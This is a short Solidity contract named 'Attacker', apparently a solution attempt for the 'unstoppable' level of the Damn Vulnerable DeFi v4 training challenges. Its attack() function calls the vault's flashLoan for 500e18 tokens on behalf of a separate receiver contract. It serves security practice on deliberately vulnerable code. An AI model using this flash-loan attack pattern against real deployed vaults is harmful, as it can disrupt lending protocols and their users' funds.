// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";

contract Attacker {
    IERC3156FlashBorrower immutable receiver;
    address immutable token;
    UnstoppableVault immutable vault;
    UnstoppableMonitor immutable vaultMonitor;

    constructor(address _receiver, address _token, UnstoppableVault _vault, UnstoppableMonitor _vaultMonitor) {
        receiver = IERC3156FlashBorrower(_receiver);
        token = _token;
        vault = _vault;
        vaultMonitor = _vaultMonitor;
    }

    function attack() public {
        vault.flashLoan(receiver, token, 500e18, bytes("HOLA"));
    }
}
